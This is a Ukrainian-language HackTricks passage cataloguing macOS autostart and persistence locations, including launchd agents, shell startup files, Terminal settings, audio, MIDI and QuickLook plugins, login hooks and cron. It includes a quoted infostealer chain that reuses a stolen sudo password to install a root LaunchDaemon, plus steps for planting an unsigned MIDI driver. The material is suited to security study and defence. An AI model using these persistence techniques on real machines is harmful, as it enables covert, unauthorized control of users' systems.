# Автозапуск macOS

{{#include ../banners/hacktricks-training.md}}

Цей розділ значною мірою ґрунтується на серії дописів у блозі [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Його мета — визначити місця, де запис файлу може призвести до подальшого виконання коду, подію, що запускає виконання, і необхідні дозволи. Наявність певного місця не доводить, що механізм увімкнено. Наведені нижче локальні перевірки виконано на macOS 26.5.2 (5 жовтня 2026 року); вони не встановлюють поведінку в кожному випуску macOS.

> [!NOTE]
> «Запуск унаслідок запису» не завжди означає «запускається одразу після запису». Деякі місця зчитуються лише під час входу в систему, запуску певної програми або виконання користувачем певної дії. Записуваний payload у вже налаштованому завданні — це також не те саме, що дозвіл зареєструвати нове завдання. Перш ніж покладатися на техніку, перевірте її в одноразовому обліковому записі або VM.

## Обхід sandbox

> [!TIP]
> Тут наведено місця автозапуску, корисні для **обходу sandbox**, які дають змогу просто **записати щось у файл** і **почекати** на дуже **поширену** **дію**, певний **проміжок часу** або **дію, яку зазвичай можна виконати** із sandbox без прав root.

### Launchd

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/Library/LaunchAgents`**
  - **Тригер**: вхід користувача в систему (або явна реєстрація)
  - Потрібні права root
- **`/Library/LaunchDaemons`**
  - **Тригер**: запуск системи (або явна реєстрація)
  - Потрібні права root
- **`/System/Library/LaunchAgents`**
  - **Тригер**: вхід користувача в систему; захищене системне розташування Apple
- **`/System/Library/LaunchDaemons`**
  - **Тригер**: запуск системи; захищене системне розташування Apple
- **`~/Library/LaunchAgents`**
  - **Тригер**: повторний вхід у систему

`launchd` не сканує розташування `~/Library/LaunchDaemons`. Завдання для окремого користувача розміщують у `~/Library/LaunchAgents`; системний каталог daemon — `/Library/LaunchDaemons`. У [посібнику Apple із запуску launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) описано каталоги, які скануються.

> [!TIP]
> Цікавий факт: у **`launchd`** є вбудований property list у секції Mach-O `__Text.__config`, що містить інші відомі служби, які launchd має запускати. Крім того, ці служби можуть містити ключі `RequireSuccess`, `RequireRun` і `RebootOnSuccess`, які означають, що їх потрібно запустити й успішно завершити.
>
> Звісно, змінити його не можна через підписування коду.

#### Опис і експлуатація

**`launchd`** — це **перший** **процес**, який виконується ядром OX S під час запуску, і останній, що завершується під час вимкнення. Його **PID** завжди має бути **1**. Цей процес **зчитує й виконує** конфігурації, указані в **ASEP** **plist-файлах**, розташованих у:

- `/Library/LaunchAgents`: агенти для окремих користувачів, установлені адміністратором
- `/Library/LaunchDaemons`: загальносистемні daemon, установлені адміністратором
- `/System/Library/LaunchAgents`: агенти для окремих користувачів, надані Apple
- `/System/Library/LaunchDaemons`: загальносистемні daemon, надані Apple

Коли користувач входить у систему, `launchd` завантажує plist-файли з `~/Library/LaunchAgents` цього користувача з його дозволами. Завдання запускаються відповідно до їхніх ключів; саме завантаження plist не означає, що процес запуститься негайно.

**Головна відмінність між агентами й daemon полягає в тому, що агенти завантажуються під час входу користувача в систему, а daemon — під час запуску системи** (адже є служби, як-от ssh, які потрібно запускати до того, як будь-який користувач отримає доступ до системи). Агенти також можуть використовувати GUI, тоді як daemon мають працювати у фоновому режимі.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Кожен елемент `ProgramArguments` є окремим аргументом; `launchd` не розбирає один рядок як команду shell. Наведений вище виправлений приклад можна перевірити на коректність синтаксису, не завантажуючи його, за допомогою `plutil -lint /path/to/example.plist`. Див. локальний запис `man launchd.plist` для `ProgramArguments`, `RunAtLoad` і `KeepAlive`.

#### Тригери файлових подій у наявних завданнях

**Уже завантажений** агент або демон може використовувати `WatchPaths`, щоб запускатися після зміни вказаного шляху. `QueueDirectories` запускає завдання, доки каталог не порожній; `StartOnMount` запускає його після монтування тому. [Посібник Apple з launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) містить приклади `WatchPaths` і `QueueDirectories`. Запис у відстежуваний файл запускає **вже налаштоване завдання**; довільне виконання коду можливе лише тоді, коли автор запису також може керувати виконуваним файлом, скриптом або даними, які інтерпретує це завдання. Сам по собі запис нового plist-файлу поза каталогом, який сканується або зареєстрований, не завантажує його.

Цей PoC із самоочищенням реєструє унікально названий **тимчасовий користувацький агент**, змінює лише власний відстежуваний файл і видаляє агент. Його успішно запустили на macOS 26.5.2 без виходу з системи чи перезавантаження:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Локальний запуск вивів `watch fired: True`, а `bootout` завершився успішно. `launchctl bootstrap` тут використовується лише в ізольованому PoC; для вже завантаженого завдання він **не потрібен**. Щоб безпечно перевірити наявне завдання, прочитайте його plist і визначений шлях `ProgramArguments`, а потім перевірте, чи можна записувати у відповідний виконуваний файл або файл, який інтерпретується, не змінюючи його.

Бувають випадки, коли **агент потрібно виконати до входу користувача в систему**; такі агенти називаються **PreLoginAgents**. Наприклад, це корисно для забезпечення доступу до допоміжних технологій під час входу. Їх також можна знайти в `/Library/LaunchAgents` (приклад див. [**тут**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)).

> [!TIP]
> Нові файли конфігурації демонів або агентів буде **завантажено після наступного перезавантаження або за допомогою** `launchctl load <target.plist>`. **Також можна завантажувати файли .plist без цього розширення** за допомогою `launchctl -F <file>` (однак ці файли plist не завантажуватимуться автоматично після перезавантаження).\
> Їх також можна **вивантажити** за допомогою `launchctl unload <target.plist>` (вказаний у ньому процес буде завершено),
>
> Щоб **переконатися**, що ніщо **не перешкоджає** **запуску** **агента** або **демона** (наприклад, перевизначення), виконайте: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Перелічіть усі агенти й демони, завантажені поточним користувачем:

```bash
launchctl list
```

#### Приклад ланцюжка шкідливого LaunchDaemon (повторне використання пароля)

Нещодавній macOS infostealer повторно використав **перехоплений пароль sudo**, щоб створити user agent і root LaunchDaemon:<sup>[[1]](#references)</sup>

- Записати цикл agent у `~/.agent` і зробити його виконуваним.
- Створити plist у `/tmp/starter`, що вказує на цей agent.
- Повторно використати викрадений пароль із `sudo -S`, щоб скопіювати його до `/Library/LaunchDaemons/com.finder.helper.plist`, встановити `root:wheel` і завантажити через `launchctl load`.
- Беззвучно запустити agent за допомогою `nohup ~/.agent >/dev/null 2>&1 &`, щоб від'єднати вивід.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plist демона, розміщений у `/Library/LaunchDaemons`, не стає безпечним лише через те, що його власником є користувач. Для системних завдань `launchd` вимагає належних власника та дозволів і може відхилити незахищений plist. Зазвичай демон, власником якого є root, запускається від root, якщо в його конфігурації не вибрано інший обліковий запис. Перевірте `UserName`, `GroupName`, власника, дозволи завдання та діагностику `launchctl`; не робіть висновків про ідентичність процесу лише за іменем власника plist.

#### Докладніше про launchd

**`launchd`** — це **перший** процес у режимі користувача, який запускається з **ядра**. Запуск процесу має бути **успішним**, і він **не може завершитися або аварійно зупинитися**. Він навіть **захищений** від деяких **сигналів завершення**.

Одне з перших завдань `launchd` — **запустити** всі **демони**, зокрема:

- **Демони таймерів**, що запускаються за розкладом:
  - `com.apple.atrun.plist` викликає `/usr/libexec/atrun` із `StartInterval = 30` секунд у macOS 26.5.2; фактичний стан увімкнення може відрізнятися від значення ключа `Disabled` у plist, оскільки launchd зберігає перевизначення окремо.
  - `com.vix.cron.plist` викликає `/usr/sbin/cron`, коли `/usr/lib/cron/tabs` містить завдання. `com.apple.systemstats.daily` — це інша запланована служба, а не демон cron.
- **Мережеві демони**, як-от:
  - `org.cups.cups-lpd`: прослуховує TCP (`SockType: stream`) із `SockServiceName: printer`
    - SockServiceName має бути портом або службою з `/etc/services`
  - `com.apple.xscertd.plist`: прослуховує TCP-порт 1640
- **Демони шляхів**, які запускаються зі зміною вказаного шляху:
  - `com.apple.postfix.master`: перевіряє шлях `/etc/postfix/aliases`
- **Демони сповіщень IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Порт Mach:**
  - `com.apple.xscertd-helper.plist`: у записі `MachServices` вказано назву `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Це відрізняється від попереднього прикладу. Він змушує launchd запускати програми у відповідь на певні події. Однак у цьому випадку основний задіяний бінарний файл — не `launchd`, а `/usr/libexec/UserEventAgent`. Він завантажує плагіни з папки, захищеної SIP: /System/Library/UserEventPlugins/. Кожен плагін указує свій ініціалізатор у ключі `XPCEventModuleInitializer` або, у старіших плагінах, у словнику `CFPluginFactories` під ключем `FB86416D-6164-2070-726F-70735C216EC0` файлу `Info.plist`.

### Файли запуску оболонки

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібно знайти програму з обходом TCC, яка запускає оболонку, що завантажує ці файли

#### Розташування

- **`~/.zshenv`** (або новіший скомпільований файл **`~/.zshenv.zwc`**)
  - **Тригер**: будь-який звичайний запуск zsh, зокрема неінтерактивний `zsh -c`; `zsh -f` пропускає файли запуску користувача.
- **`~/.zshrc`**
  - **Тригер**: запуск інтерактивного zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Тригер**: запуск login zsh; ці файли читаються відповідно до та після `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Тригер**: відкриття термінала із zsh
  - Потрібен root
- **`~/.zlogout`**
  - **Тригер**: нормальне завершення login zsh, а не кожен вихід із термінала чи оболонки.
- **`/etc/zlogout`**
  - **Тригер**: вихід із термінала із zsh
  - Потрібен root
- Потенційно більше файлів у: **`man zsh`**
- **`~/.bashrc`**
  - **Тригер**: запуск інтерактивного **не-login** Bash. Інтерактивний login Bash читає його, лише якщо файл запуску явно його підключає.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Тригер**: запуск login Bash; виконується перший доступний для читання файл у цьому порядку. `~/.profile` пропускається, якщо існує будь-який із двох попередніх файлів.
- **`/etc/profile`**
  - **Тригер**: запуск login Bash; для зміни потрібен root.
- **`~/.tcshrc`** або, якщо його немає, **`~/.cshrc`**
  - **Тригер**: запуск `tcsh`, зокрема неінтерактивного `tcsh -c` на цьому Mac. Користувач має фактично запустити `tcsh`; це не стандартна оболонка macOS.
- **`~/.login`**
  - **Тригер**: запуск login `tcsh` після його rc-файлу.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Тригер**: очікується запуск із xterm, але він **не встановлений**, і навіть після встановлення з’являється така помилка: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Опис і експлуатація

Під час запуску оболонки, як-от `zsh` або `bash`, **виконуються певні файли запуску**. Зараз у macOS стандартною оболонкою є `/bin/zsh`. Чи запускають Terminal або SSH login-оболонку або інтерактивну оболонку, залежить від їхньої конфігурації; не припускайте, що в кожному сеансі виконуються всі наведені вище файли. Хоча в macOS також є `bash` і `sh`, їх потрібно запускати явно.<sup>[[2]](#references)</sup> [Довідник із файлів запуску zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) описує порядок їх читання, перевизначення `ZDOTDIR` і правило `.zwc`.

У наведеному нижче експерименті лише для читання використовувався тимчасовий `ZDOTDIR` у macOS 26.5.2. Він показує, які файли користувача читалися; жоден справжній файл запуску оболонки не змінювався:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Спостережуваний порядок був таким: `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` уже має вказувати на альтернативний каталог; просто створити файли в довільному каталозі недостатньо.

[Довідник запуску Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) розрізняє login та interactive shells. На тестовій машині з macOS 26.5.2 ізольований `HOME`, що містив усі чотири користувацькі файли запуску, давав такі результати: `bash -c` → жодного; `bash -ic` → `.bashrc`; `bash -lc` і `bash -lic` → лише `.bash_profile`. Після видалення `.bash_profile` login Bash читав `.bash_login`, а після його видалення — `.profile`. `BASH_ENV` може вказувати noninteractive Bash на файл, але цю змінну середовища вже має бути встановлено в процесі, що його запускає. Явна команда `exit` у login Bash також може завантажити `~/.bash_logout`.

Локальний довідник `tcsh(1)` описує окремий порядок запуску. З тимчасовим `HOME` команда `/bin/tcsh -c :` читала `.tcshrc` або `.cshrc`, якщо `.tcshrc` не було. Запущений у режимі login тимчасовий `tcsh` читав `.tcshrc` і `.login`. Під час цих перевірок створювали й видаляли лише тимчасові файли.

### Повторне відкриття програм

> [!CAUTION]
> Під час тестування налаштування вказаного способу експлуатації та вихід із системи з подальшим входом або навіть перезавантаження не призвели до запуску програми. Можливо, під час виконання цих дій програма має бути запущена.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Тригер**: перезапуск, що відкриває програми повторно

#### Опис і експлуатація

Усі програми, які потрібно відкрити повторно, містяться у plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Отже, щоб програми, які відкриваються повторно, запускали вашу програму, потрібно лише **додати її до списку**.

UUID можна знайти, переглянувши цей каталог, або за допомогою команди `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Щоб переглянути програми, які буде відкрито повторно, виконайте:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Щоб **додати програму до цього списку**, можна скористатися:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Налаштування Terminal

Опис: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal має дозволи FDA користувача, який ним користується

#### Розташування

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Тригер**: відкриття нового вікна або вкладки Terminal із профілем, у налаштуваннях Shell якого вказано команду запуску

#### Опис і експлуатація

У **`~/Library/Preferences`** зберігаються налаштування програм користувача. Деякі з них можуть містити конфігурацію для **запуску інших програм/скриптів**.<sup>[[5]](#references)</sup>

Наприклад, Terminal може виконати команду під час запуску:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ця конфігурація відображається у файлі **`~/Library/Preferences/com.apple.Terminal.plist`** ось так:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Якщо відповідний профіль містить команду запуску, і Terminal зчитує це налаштування, новий сеанс із цим профілем може виконати її. [Поточний посібник Apple з Terminal](https://support.apple.com/guide/terminal/trmlshll/mac) описує команду **Shell → Startup** для кожного профілю. Самого відкриття Terminal без нового сеансу з цим профілем недостатньо. Наведені нижче зміни налаштувань **не виконувалися** на дослідницькому Mac.

Це можна додати через cli:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Скрипти Terminal / інші розширення файлів

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal використовує його, щоб отримати дозволи FDA користувача

#### Розташування

- **Будь-де**
  - **Тригер**: Відкрити відповідний файл `.terminal`, `.command` або `.tool`

#### Опис і експлуатація

Якщо користувач відкриває файл налаштувань **`.terminal`**, Terminal може створити сеанс із його профілю; виконувані файли **`.command`** і **`.tool`** також можна відкрити в Terminal. Це явний тригер відкриття файла, а не виконання коду просто під час відкриття Terminal. Успадкований доступ TCC залежить від фактичних дозволів Terminal і виконуваної операції. Наведений нижче історичний приклад не запускали на дослідницькому Mac.

Спробуйте так:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Також можна використовувати розширення **`.command`**, **`.tool`** зі звичайним вмістом shell-скриптів — вони також відкриватимуться в Terminal.

> [!CAUTION]
> Якщо Terminal має **Повний доступ до диска**, він зможе виконати цю дію (зверніть увагу: виконана команда буде видна у вікні Terminal).

### Аудіоплагіни

Матеріал: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Матеріал: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Можна отримати додатковий доступ TCC

#### Розташування

- **`/Library/Audio/Plug-Ins/HAL`**
  - Потрібні права root
  - **Тригер**: сервер Core Audio завантажує сумісний HAL device plug-in; перезапуск сервера може призвести до повторного виявлення
- **`/Library/Audio/Plug-ins/Components`**
  - Потрібні права root
  - **Тригер**: аудіохост виявляє та створює екземпляр встановленого Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Тригер**: аудіохост виявляє та створює екземпляр встановленого Audio Unit
- **`/System/Library/Components`**
  - Розташування, захищене системою та призначене для компонентів Apple
  - **Тригер**: аудіохост створює екземпляр відповідного системного компонента

#### Опис

Згідно з попередніми матеріалами, можна **скомпілювати деякі аудіоплагіни** та домогтися їх завантаження.<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-ins і Audio Units використовують різні шляхи завантаження. У [посібнику Apple з хостингу Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) зазначено, що хост має знайти компонент і створити його екземпляр; саме копіювання компонента в каталог сканування чи перезапуск `coreaudiod` не доводить, що код виконується. AUv2 plug-ins запускаються в процесі хоста, тоді як згідно з [актуальними рекомендаціями Apple щодо Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments), за замовчуванням AUv3 запускається в окремому процесі на macOS. Вимоги до підпису, sandbox і перевірки бібліотек залежать від хоста. На дослідницькому Mac аудіоплагіни не встановлювалися й не запускалися.

### Драйвери CoreMIDI (MIDIServer)

Матеріал: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ваш код виконується всередині процесу `MIDIServer`, а не в sandbox вашого застосунку
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` працює у власному профілі sandbox `seatbelt`

#### Розташування

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Права root не потрібні (доступно для запису користувачу)
  - **Тригер**: `MIDIServer` запускається або перезапускається. Він запускається за запитом, коли будь-який процес уперше використовує CoreMIDI (відкриває *Audio MIDI Setup*, GarageBand, DAW або сторінку, що використовує WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Потрібні права root
  - **Тригер**: такий самий, як вище

#### Опис і експлуатація

`MIDIServer` від Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) завантажує MIDI **driver** bundles із каталогів `Audio/MIDI Drivers`. Бінарний файл підписаний Apple, але постачається з entitlement `com.apple.security.cs.disable-library-validation`, тому він завантажить bundle, **непідписаний або ad-hoc підписаний іншою командою**, що забезпечує виконання коду в окремому процесі, який належить Apple, **без прав root**.<sup>[[53]](#references)</sup>

Перевірено на macOS 26 (лише читання):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Драйвер — це стандартний bundle, який експортує фабрику `MIDIDriverInterface`; розміщення payload у фабриці/конструкторі змушує його запускатися одразу, щойно `MIDIServer` перелічує драйвери. Зберіть його, помістіть як `~/Library/Audio/MIDI Drivers/Evil.plugin`, а потім ініціюйте завантаження без виходу із системи чи перезавантаження:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Плагіни QuickLook

Опис: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Можна отримати додатковий доступ TCC

#### Розташування

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Опис і експлуатація

Плагіни QuickLook можуть виконуватися, коли ви **викликаєте попередній перегляд файлу** (натискаєте пробіл, вибравши файл у Finder) і встановлено **плагін, що підтримує цей тип файлу**.<sup>[[8]](#references)</sup>

Можна скомпілювати власний плагін QuickLook, розмістити його в одному з наведених вище розташувань, щоб завантажити, а потім перейти до файлу підтримуваного типу й натиснути пробіл, щоб запустити його.

Ці шляхи стосуються застарілих пакетів `.qlgenerator`; [посібник Apple з архітектури Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) описує порядок пошуку та відповідність типам файлів. Сучасні **розширення програм** Quick Look постачаються в складі програми та мають інші правила реєстрації й виконання. Наявність генератора не доводить, що саме він буде вибраний для типу файлу або що його код виконуватиметься безпосередньо у Finder. Шлях застарілих генераторів перевірено за документацією та наявністю каталогів; на дослідницькому Mac генератор не встановлювали й не завантажували.

### ~~Хуки входу/виходу~~

> [!CAUTION]
> У мене це не спрацювало — ані з LoginHook користувача, ані з LogoutHook root-користувача

**Опис**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Потрібно мати змогу виконати щось на кшталт `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`знаходиться в `~/Library/Preferences/com.apple.loginwindow.plist`

Вони застаріли, але їх можна використовувати для виконання команд під час входу користувача в систему.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Цей параметр зберігається у `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Щоб видалити це:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Користувач root зберігається в **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Умовний обхід Sandbox

> [!TIP]
> Тут ви знайдете місця автозапуску, корисні для **обходу sandbox**, які дають змогу просто виконати щось, **записавши це у файл** і **розраховуючи на не надто поширені умови**, як-от наявність певних **встановлених програм, «незвичні» дії користувача** або середовища.

### Cron

**Опис**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Однак потрібно мати змогу виконати бінарний файл `crontab`
  - Або бути root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/usr/lib/cron/tabs/`**
  - Для прямого запису потрібні права root. Права root не потрібні, якщо ви можете виконати `crontab <file>`
  - **Тригер**: Розклад у встановленому crontab. `at` і `periodic` — це окремі механізми, описані нижче.

#### Опис і експлуатація

Вивести список завдань cron **поточного користувача** можна так:

```bash
crontab -l
```

У launchd plist системного cron daemon є запис `QueueDirectories` для `/usr/lib/cron/tabs`; саме там зберігаються встановлені crontab користувачів. Для перегляду crontab інших користувачів потрібні права root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

У тимчасовому обліковому записі можна встановити запис user cron, що містить лише маркер, за допомогою `crontab`, а після спостереження видалити його. Виконання `crontab <file>` **замінює весь наявний crontab облікового запису**, тому збережіть і відновіть його, якщо обліковий запис не є тимчасовим:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
